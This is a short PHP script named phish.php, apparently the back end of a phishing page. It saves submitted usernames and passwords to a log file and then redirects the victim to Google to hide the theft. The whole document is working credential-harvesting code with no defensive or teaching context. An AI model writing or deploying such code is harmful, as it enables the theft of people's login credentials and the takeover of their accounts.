<?php  
// phish.php  
$logfile = "logs.txt";  
$data = $_POST['username'] . ":" . $_POST['password'] . "\n";  
file_put_contents($logfile, $data, FILE_APPEND);  
header("Location: https://www.google.com"); // Redirect to real site  
exit;  
?>  